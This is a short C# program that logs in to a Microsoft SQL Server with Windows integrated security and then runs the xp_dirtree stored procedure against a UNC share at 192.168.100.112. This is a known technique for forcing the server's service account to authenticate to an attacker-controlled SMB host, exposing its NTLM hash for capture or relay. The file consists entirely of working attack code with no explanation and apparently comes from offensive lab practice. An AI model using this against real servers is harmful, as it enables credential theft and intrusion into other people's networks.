using System;
using System.Data.SqlClient;
namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "COMPUTER";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database +
           "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String query = "EXEC master..xp_dirtree \"\\\\192.168.100.112\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
